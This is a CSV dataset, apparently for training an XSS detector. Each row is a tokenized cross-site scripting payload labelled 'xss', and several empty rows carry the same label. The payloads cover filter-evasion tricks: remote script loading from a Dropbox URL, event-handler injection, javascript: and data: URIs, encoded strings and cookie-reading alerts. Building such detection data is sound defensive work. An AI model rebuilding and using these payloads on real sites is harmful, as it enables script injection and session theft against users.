,text,label
35,LT script SLSH BITAND tab SMCLN src EQ SQUT https CLN SLSH SLSH dl DOT dropbox DOT com SLSH u SLSH INT SLSH js DOT js SQUT SLSH BITAND tab SMCLN GT LT SLSH script GT,xss
36,,xss
37,LT script INT MINUS INT STAR INT PLUS INT SLSH INT EQ GT prompt LPRN INT RPRN LT SLSH script giveanswerhere EQ QSTN,xss
38,,xss
39,LT iframe SLSH src EQ DQUT DATA CLN TEXT SLSH html SMCLN BITAND tab SMCLN BASE64 BITAND tab SMCLN CMMA pgjvzhkgb25sb2fkpwfszxj0kdeppg EQ EQ DQUT GT,xss
40,,xss
41,LT script SLSH STAR PRCNT INT STAR SLSH GT SLSH STAR PRCNT INT STAR SLSH alert LPRN INT RPRN SLSH STAR PRCNT INT STAR SLSH LT SLSH script SLSH STAR PRCNT INT STAR SLSH,xss
42,,xss
43,BITAND HASH INT SMCLN BITAND HASH INT SMCLN LT h1 SLSH onmouseover EQ SQUT BSLSH u0061lert LPRN INT RPRN SQUT GT PRCNT INT,xss
44,,xss
45,LT iframe SLSH src EQ DQUT DATA CLN TEXT SLSH html CMMA LT svg BITAND HASH INT SMCLN BITAND HASH INT SMCLN LOAD EQ alert LPRN INT RPRN GT DQUT GT,xss
46,,xss
47,LT meta CONTENT EQ DQUT BITAND newline SMCLN INT BITAND newline SMCLN SMCLN javascript BITAND colon SMCLN alert LPRN INT RPRN DQUT http MINUS equiv EQ DQUT REFRESH DQUT SLSH GT,xss
48,,xss
49,LT svg GT LT script xlink CLN href EQ DATA BITAND colon SMCLN CMMA WINDOW DOT OPEN LPRN SQUT https CLN SLSH SLSH www DOT google DOT com SLSH SQUT RPRN GT LT SLSH script,xss
50,,xss
51,LT svg GT LT script x CLN href EQ SQUT https CLN SLSH SLSH dl DOT dropbox DOT com SLSH u SLSH INT SLSH js DOT js SQUT LCBR opera RCBR,xss
52,,xss
53,LT meta http MINUS equiv EQ DQUT REFRESH DQUT CONTENT EQ DQUT INT SMCLN url EQ javascript CLN confirm LPRN INT RPRN DQUT GT,xss
54,LT iframe src EQ javascript BITAND colon SMCLN alert BITAND lpar SMCLN DOCUMENT BITAND PERIOD SMCLN LOCATION BITAND rpar SMCLN GT,xss
55,,xss
56,LT form GT LT A href EQ DQUT javascript CLN BSLSH u0061lert BITAND HASH x28 SMCLN INT BITAND HASH x29 SMCLN DQUT GT x,xss
57,,xss
58,LT SLSH script GT LT img SLSH STAR PRCNT INT SLSH src EQ DQUT worksinchrome BITAND colon SMCLN prompt BITAND HASH x28 SMCLN INT BITAND HASH x29 SMCLN DQUT SLSH PRCNT INT STAR SLSH onerror EQ SQUT eval LPRN src RPRN SQUT GT,xss
59,LT img SLSH BITAND HASH INT SMCLN BITAND HASH INT SMCLN BITAND HASH INT SMCLN src EQ REMOVE TLDE REMOVE onerror EQ prompt LPRN INT RPRN GT,xss
60,LT form GT LT iframe BITAND HASH INT SMCLN BITAND HASH INT SMCLN BITAND HASH INT SMCLN src EQ DQUT javascript BITAND HASH INT SMCLN alert LPRN INT RPRN DQUT BITAND HASH INT SMCLN BITAND HASH INT SMCLN BITAND HASH INT SMCLN SMCLN GT,xss
61,,xss
62,LT A href EQ DQUT DATA CLN application SLSH x MINUS x509 MINUS USER MINUS cert SMCLN BITAND newline SMCLN BASE64 BITAND newline SMCLN CMMA phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg EQ EQ DQUT BITAND HASH INT SMCLN BITAND HASH INT SMCLN BITAND HASH INT SMCLN GT x LT SLSH A,xss
63,,xss
64,http CLN SLSH SLSH www DOT google LT script DOT com GT alert LPRN DOCUMENT DOT LOCATION RPRN LT SLSH script,xss
65,,xss
66,LT A BITAND HASH INT SMCLN href BITAND HASH INT SMCLN BITAND HASH INT SMCLN BITAND HASH INT SMCLN BITAND HASH INT SMCLN DQUT BITAND HASH INT SMCLN onmouseover EQ prompt BITAND HASH INT SMCLN INT BITAND HASH INT SMCLN BITAND HASH INT SMCLN BITAND HASH INT SMCLN DQUT GT xyz LT SLSH A,xss
67,,xss
68,LT img SLSH src EQ ATR BITAND HASH INT SMCLN BITAND HASH INT SMCLN onerror EQ prompt LPRN SQUT BITAND HASH INT SMCLN SQUT RPRN,xss
69,,xss
70,LT STYLE SLSH onload EQ prompt BITAND HASH INT SMCLN SQUT BITAND HASH INT SMCLN BITAND HASH INT SMCLN BITAND HASH INT SMCLN SQUT BITAND HASH INT SMCLN,xss
71,,xss
72,LT script XOR __ XOR GT alert LPRN string DOT fromcharcode LPRN INT RPRN RPRN LT SLSH script XOR __ XOR,xss
73,,xss
74,LT SLSH STYLE BITAND HASH INT SMCLN GT LT script BITAND HASH INT SMCLN CLN MINUS LPRN GT SLSH STAR STAR SLSH alert LPRN DOCUMENT DOT LOCATION RPRN SLSH STAR STAR SLSH LT SLSH script BITAND HASH INT SMCLN CLN MINUS LPRN,xss
75,,xss
76,BITAND HASH INT SMCLN LT SLSH form GT LT INPUT TYPE BITAND HASH INT SMCLN DQUT DATE DQUT onfocus EQ DQUT alert LPRN INT RPRN DQUT GT,xss
77,,xss
78,LT form GT LT textarea BITAND HASH INT SMCLN onkeyup EQ SQUT BSLSH u0061 BSLSH u006c BSLSH u0065 BSLSH u0072 BSLSH u0074 BITAND HASH x28 SMCLN INT BITAND HASH x29 SMCLN SQUT GT,xss
79,,xss
80,LT script SLSH STAR STAR STAR SLSH GT SLSH STAR STAR STAR SLSH confirm LPRN SQUT BSLSH uff41 BSLSH uff4c BSLSH uff45 BSLSH uff52 BSLSH uff54 BSLSH u1455 BSLSH uff11 BSLSH u1450 SQUT RPRN SLSH STAR STAR STAR SLSH LT SLSH script SLSH STAR STAR STAR SLSH,xss
81,,xss
82,LT iframe srcdoc EQ SQUT BITAND lt SMCLN body onload EQ prompt BITAND lpar SMCLN INT BITAND rpar SMCLN BITAND gt SMCLN SQUT GT,xss
83,,xss
84,LT A href EQ DQUT javascript CLN void LPRN INT RPRN DQUT onmouseover EQ BITAND newline SMCLN javascript CLN alert LPRN INT RPRN BITAND newline SMCLN GT x LT SLSH A GT,xss
85,,xss
86,LT script TLDE TLDE TLDE GT alert LPRN INT PRCNT INT RPRN LT SLSH script TLDE TLDE TLDE GT,xss
87,,xss
88,LT STYLE SLSH onload EQ BITAND lt SMCLN EXCLM MINUS MINUS BITAND HASH INT SMCLN BITAND gt SMCLN BITAND HASH INT SMCLN alert BITAND HASH INT SMCLN BITAND lpar SMCLN INT BITAND rpar SMCLN GT,xss
89,,xss
90,LT SLSH SLSH SLSH STYLE SLSH SLSH SLSH GT LT span PRCNT 2f onmousemove EQ SQUT alert BITAND lpar SMCLN INT BITAND rpar SMCLN SQUT GT span,xss
91,,xss
92,LT img SLSH src EQ SQUT http CLN SLSH SLSH i DOT imgur DOT com SLSH p8ml8 DOT jpg SQUT onmouseover EQ BITAND tab SMCLN prompt LPRN INT RPRN,xss
93,,xss
94,BITAND HASH INT SMCLN BITAND HASH INT SMCLN LT svg GT LT STYLE GT LCBR MINUS o MINUS LINK MINUS SOURCE BITAND colon SMCLN SQUT LT body SLSH onload EQ confirm LPRN INT RPRN GT SQUT,xss
95,,xss
96,BITAND HASH INT SMCLN LT blink SLSH BITAND HASH INT SMCLN onmouseover EQ pr BITAND HASH x6f SMCLN mp BITAND HASH INT SMCLN LPRN INT RPRN GT onmouseover LCBR firefox BITAND opera RCBR,xss
97,,xss
98,LT marquee onstart EQ SQUT javascript CLN alert BITAND HASH x28 SMCLN INT BITAND HASH x29 SMCLN SQUT GT XOR __ XOR,xss
99,,xss
100,LT DIV SLSH STYLE EQ DQUT width CLN EXPRESSION LPRN confirm LPRN INT RPRN RPRN DQUT GT x LT SLSH DIV GT LCBR ie7 RCBR,xss
101,,xss
102,LT iframe SLSH PRCNT INT SLSH src EQ javascript BITAND colon SMCLN alert LPRN INT RPRN,xss
103,,xss
104,SLSH SLSH LT form SLSH ACTION EQ javascript BITAND HASH x3a SMCLN alert BITAND lpar SMCLN DOCUMENT BITAND PERIOD SMCLN cookie BITAND rpar SMCLN GT LT INPUT SLSH TYPE EQ SQUT submit SQUT GT SLSH SLSH,xss
105,,xss
106,SLSH STAR iframe SLSH src STAR SLSH LT iframe SLSH src EQ DQUT LT iframe SLSH src EQ ATR DQUT SLSH onload EQ prompt LPRN INT RPRN SLSH STAR iframe SLSH src STAR SLSH GT,xss
107,,xss
108,SLSH SLSH BITOR BSLSH BSLSH LT script SLSH SLSH BITOR BSLSH BSLSH src EQ SQUT https CLN SLSH SLSH dl DOT dropbox DOT com SLSH u SLSH INT SLSH js DOT js SQUT GT SLSH SLSH BITOR BSLSH BSLSH LT SLSH script SLSH SLSH BITOR BSLSH BSLSH,xss
109,,xss
110,LT SLSH font GT SLSH LT svg GT LT STYLE GT LCBR src BITAND HASH x3a SMCLN SQUT LT STYLE SLSH onload EQ this DOT onload EQ confirm LPRN INT RPRN GT SQUT LT SLSH font GT SLSH LT SLSH STYLE GT,xss
111,,xss
112,LT A SLSH href EQ DQUT javascript CLN BITAND HASH INT SMCLN javascript CLN prompt LPRN INT RPRN DQUT GT LT INPUT TYPE EQ DQUT x DQUT GT,xss
113,,xss
114,LT SLSH plaintext BSLSH GT LT SLSH BITOR BSLSH GT LT plaintext SLSH onmouseover EQ prompt LPRN INT RPRN,xss
115,,xss
116,LT SLSH svg GT SQUT SQUT LT svg GT LT script SQUT aquickbrownfoxjumpsoverthelazydog SQUT GT alert BITAND HASH x28 SMCLN INT BITAND HASH x29 SMCLN LCBR opera RCBR,xss
117,,xss
118,LT A href EQ DQUT javascript BITAND colon SMCLN BSLSH u0061 BITAND HASH x6c SMCLN BITAND HASH INT PRCNT 72t BITAND lpar SMCLN INT BITAND rpar SMCLN DQUT GT LT button GT,xss
119,,xss
120,LT DIV onmouseover EQ SQUT alert BITAND lpar SMCLN INT BITAND rpar SMCLN SQUT GT DIV LT SLSH DIV GT,xss
121,,xss
122,LT iframe STYLE EQ DQUT xg MINUS P CLN ABSOLUTE SMCLN top CLN INT SMCLN LEFT CLN INT SMCLN width CLN INT PRCNT SMCLN height CLN INT PRCNT DQUT onmouseover EQ DQUT prompt LPRN INT RPRN DQUT GT,xss
123,,xss
124,LT A href EQ DQUT javascript BITAND colon SMCLN alert BITAND lpar SMCLN INT BITAND rpar SMCLN DQUT GT x LT SLSH A GT,xss
125,,xss
126,LT embed src EQ DQUT http CLN SLSH SLSH corkami DOT googlecode DOT com SLSH svn SLSH EXCLM svn SLSH bc SLSH INT SLSH trunk SLSH misc SLSH pdf SLSH helloworld_js_x DOT pdf DQUT GT,xss
127,,xss
128,LT OBJECT DATA EQ DQUT http CLN SLSH SLSH corkami DOT googlecode DOT com SLSH svn SLSH EXCLM svn SLSH bc SLSH INT SLSH trunk SLSH misc SLSH pdf SLSH helloworld_js_x DOT pdf DQUT GT,xss
129,,xss
130,LT var onmouseover EQ DQUT prompt LPRN INT RPRN DQUT GT ON mouse OVER LT SLSH var GT,xss
131,,xss
132,LT A href EQ javascript BITAND colon SMCLN alert BITAND lpar SMCLN DOCUMENT BITAND PERIOD SMCLN cookie BITAND rpar SMCLN GT click here LT SLSH A GT,xss
133,,xss
134,LT img src EQ DQUT SLSH DQUT EQ _ EQ DQUT title EQ DQUT onerror EQ SQUT prompt LPRN INT RPRN SQUT DQUT GT,xss
135,,xss
136,LT PRCNT LT EXCLM MINUS MINUS SQUT PRCNT GT LT script GT alert LPRN INT RPRN SMCLN LT SLSH script MINUS MINUS GT,xss
137,,xss
138,LT script src EQ DQUT DATA CLN TEXT SLSH javascript CMMA alert LPRN INT RPRN DQUT GT LT SLSH script GT,xss
139,LT iframe SLSH src BSLSH SLSH BSLSH SLSH onload EQ prompt LPRN INT RPRN,xss
140,,xss
141,LT iframe SLSH onreadystatechange EQ alert LPRN INT RPRN,xss
142,,xss
143,LT svg SLSH onload EQ alert LPRN INT RPRN,xss
144,,xss
145,LT INPUT VALUE EQ LT GT LT iframe SLSH src EQ javascript CLN confirm LPRN INT RPRN,xss
146,,xss
147,LT INPUT TYPE EQ DQUT TEXT DQUT VALUE EQ REMOVE REMOVE LT DIV SLSH onmouseover EQ SQUT alert LPRN INT RPRN SQUT GT x LT SLSH DIV GT,xss
148,,xss
149,http CLN SLSH SLSH www DOT LT script GT alert LPRN INT RPRN LT SLSH script DOT com,xss
150,,xss
151,LT iframe src EQ j BITAND newline SMCLN BITAND tab SMCLN A BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN v BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN A BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN s BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN C BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN r BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN i BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN P BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN T BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND colon SMCLN A BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN l BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN e BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN r BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN T BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN INT BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN INT BITAND newline SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN BITAND tab SMCLN PRCNT INT GT LT SLSH iframe GT,xss
152,,xss
153,LT svg GT LT script QSTN GT alert LPRN INT RPRN,xss
154,,xss
155,LT iframe src EQ j BITAND tab SMCLN A BITAND tab SMCLN v BITAND tab SMCLN A BITAND tab SMCLN s BITAND tab SMCLN C BITAND tab SMCLN r BITAND tab SMCLN i BITAND tab SMCLN P BITAND tab SMCLN T BITAND tab SMCLN CLN A BITAND tab SMCLN l BITAND tab SMCLN e BITAND tab SMCLN r BITAND tab SMCLN T BITAND tab SMCLN PRCNT INT BITAND tab SMCLN INT BITAND tab SMCLN PRCNT INT GT LT SLSH iframe GT,xss
156,,xss
157,LT img src EQ REMOVE xx CLN xx REMOVE onerror EQ alert LPRN INT RPRN GT,xss
158,,xss
159,LT meta http MINUS equiv EQ DQUT REFRESH DQUT CONTENT EQ DQUT INT SMCLN javascript BITAND colon SMCLN alert LPRN INT RPRN DQUT SLSH GT,xss
160,LT math GT LT A xlink CLN href EQ DQUT SLSH SLSH jsfiddle DOT net SLSH t846h SLSH DQUT GT click,xss
161,,xss
162,LT embed code EQ DQUT http CLN SLSH SLSH businessinfo DOT co DOT uk SLSH labs SLSH xss SLSH xss DOT swf DQUT allowscriptaccess EQ ALWAYS GT,xss
163,LT svg contentscripttype EQ TEXT SLSH vbs GT LT script GT msgbox PLUS INT,xss
164,,xss
165,LT A href EQ DQUT DATA CLN TEXT SLSH html SMCLN base64_ CMMA LT svg SLSH onload EQ BSLSH u0061 BITAND HASH x6c SMCLN BITAND HASH INT PRCNT 72t LPRN INT RPRN GT DQUT GT x LT SLSH A,xss
166,,xss
167,LT iframe SLSH onreadystatechange EQ BSLSH u0061 BSLSH u006c BSLSH u0065 BSLSH u0072 BSLSH u0074 LPRN SQUT BSLSH u0061 SQUT RPRN worksinie GT,xss
168,,xss
169,LT script GT TLDE SQUT BSLSH u0061 SQUT SMCLN BSLSH u0074 BSLSH u0068 BSLSH u0072 BSLSH u006f BSLSH u0077 TLDE BSLSH u0074 BSLSH u0068 BSLSH u0069 BSLSH u0073 DOT BSLSH u0061 BSLSH u006c BSLSH u0065 BSLSH u0072 BSLSH u0074 LPRN TLDE SQUT BSLSH u0061 SQUT RPRN LT SLSH script u PLUS,xss
170,,xss
171,LT script SLSH src EQ DQUT DATA BITAND colon SMCLN TEXT PRCNT 2fj BSLSH u0061v BSLSH u0061script CMMA BSLSH u0061lert LPRN SQUT BSLSH u0061 SQUT RPRN DQUT GT LT SLSH script A EQ BSLSH u0061 BITAND SLSH EQ PRCNT 2f,xss
172,LT script SLSH src EQ DATA BITAND colon SMCLN TEXT SLSH j BSLSH u0061v BSLSH u0061 BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT CMMA BSLSH u0061 PRCNT 6c PRCNT INT PRCNT INT PRCNT INT LPRN SLSH xss SLSH RPRN GT LT SLSH script,xss
173,,xss
174,LT OBJECT DATA EQ javascript BITAND colon SMCLN BSLSH u0061 BITAND HASH x6c SMCLN BITAND HASH INT PRCNT 72t LPRN INT RPRN GT,xss
175,,xss
176,LT script GT PLUS MINUS PLUS MINUS INT MINUS PLUS MINUS PLUS alert LPRN INT RPRN LT SLSH script GT,xss
177,,xss
178,LT body SLSH onload EQ BITAND lt SMCLN EXCLM MINUS MINUS BITAND gt SMCLN BITAND HASH 10alert LPRN INT RPRN GT,xss
179,,xss
180,LT script itworksinallbrowsers GT SLSH STAR LT script STAR STAR SLSH alert LPRN INT RPRN LT SLSH script,xss
181,,xss
182,LT img src QSTN itworksonchrome QSTN BSLSH SLSH onerror EQ alert LPRN INT RPRN,xss
183,,xss
184,LT svg GT LT script GT SLSH SLSH BITAND newline SMCLN confirm LPRN INT RPRN SMCLN LT SLSH script LT SLSH svg GT,xss
185,LT svg GT LT script onlypossibleinopera CLN MINUS RPRN GT alert LPRN INT RPRN,xss
186,,xss
187,LT A aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href EQ j BITAND HASH 97v BITAND HASH 97script BITAND HASH x3a SMCLN BITAND HASH 97lert LPRN INT RPRN GT clickme,xss
188,,xss
189,LT script x GT alert LPRN INT RPRN LT SLSH script INT EQ INT,xss
190,,xss
191,LT DIV SLSH onmouseover EQ SQUT alert LPRN INT RPRN SQUT GT STYLE EQ DQUT x CLN DQUT GT,xss
192,,xss
193,LT MINUS MINUS REMOVE LT img SLSH src EQ REMOVE onerror EQ alert LPRN INT RPRN GT MINUS MINUS EXCLM GT,xss
194,LT script SLSH src EQ BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT CLN TEXT SLSH BITAND HASH x6a BITAND HASH x61 BITAND HASH x76 BITAND HASH x61 BITAND HASH x73 BITAND HASH x63 BITAND HASH x72 BITAND HASH x69 BITAND HASH x000070 BITAND HASH x074 CMMA BITAND HASH x0061 SMCLN BITAND HASH x06c SMCLN BITAND HASH x0065 SMCLN BITAND HASH x00000072 SMCLN BITAND HASH x00074 SMCLN LPRN INT RPRN GT LT SLSH script GT,xss
195,,xss
196,LT DIV STYLE EQ DQUT xg MINUS P CLN ABSOLUTE SMCLN top CLN INT SMCLN LEFT CLN INT SMCLN width CLN INT PRCNT SMCLN height CLN INT PRCNT DQUT onmouseover EQ DQUT prompt LPRN INT RPRN DQUT onclick EQ DQUT alert LPRN INT RPRN DQUT GT x LT SLSH button GT,xss
197,,xss
198,DQUT GT LT img src EQ x onerror EQ WINDOW DOT OPEN LPRN SQUT https CLN SLSH SLSH www DOT google DOT com SLSH SQUT RPRN SMCLN GT,xss
199,,xss
200,LT form GT LT button formaction EQ javascript BITAND colon SMCLN alert LPRN INT RPRN GT clickme,xss
201,,xss
202,LT math GT LT A xlink CLN href EQ DQUT SLSH SLSH jsfiddle DOT net SLSH t846h SLSH DQUT GT click,xss
203,,xss
204,LT OBJECT DATA EQ DATA CLN TEXT SLSH html SMCLN BASE64 CMMA phn2zy9vbmxvywq9ywxlcnqomik PLUS GT LT SLSH OBJECT GT,xss
205,,xss
206,LT iframe src EQ DQUT DATA CLN TEXT SLSH html CMMA PRCNT 3c PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT 3e PRCNT INT PRCNT 6c PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT 3c PRCNT 2f PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT INT PRCNT 3e DQUT GT LT SLSH iframe GT,xss
207,,xss
208,LT A href EQ DQUT DATA CLN TEXT SLSH html SMCLN blabla CMMA BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT BITAND HASH INT DQUT GT click me LT SLSH A GT,xss
209,,xss
210,LT script GT string DOT fromcharcode LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN LT SLSH script GT,xss
211,‘ SMCLN alert LPRN string DOT fromcharcode LPRN INT CMMA INT CMMA INT RPRN RPRN SLSH SLSH ’ SMCLN alert LPRN string DOT fromcharcode LPRN INT CMMA INT CMMA INT RPRN RPRN SLSH SLSH ” SMCLN alert LPRN string DOT fromcharcode LPRN INT CMMA INT CMMA INT RPRN RPRN SLSH SLSH ” SMCLN alert LPRN string DOT fromcharcode LPRN INT CMMA INT CMMA INT RPRN RPRN SLSH SLSH – GT LT SLSH script GT ” GT ’ GT LT script GT alert LPRN string DOT fromcharcode LPRN INT CMMA INT CMMA INT RPRN RPRN LT SLSH script GT,xss
212,LT img RQUT ”” GT LT script GT alert LPRN RQUT xss” RPRN LT SLSH script GT ” GT,xss
213,LT img src EQ javascript CLN alert LPRN string DOT fromcharcode LPRN INT CMMA INT CMMA INT RPRN RPRN GT,xss
214,LT img src EQ ”jav ascript CLN alert LPRN ‘xss’ RPRN SMCLN ” GT,xss
215,LT img src EQ ”jav BITAND HASH x09 SMCLN ascript CLN alert LPRN ‘xss’ RPRN SMCLN ” GT,xss
216,LT LT script GT alert LPRN RQUT xss” RPRN SMCLN SLSH SLSH LT LT SLSH script GT,xss
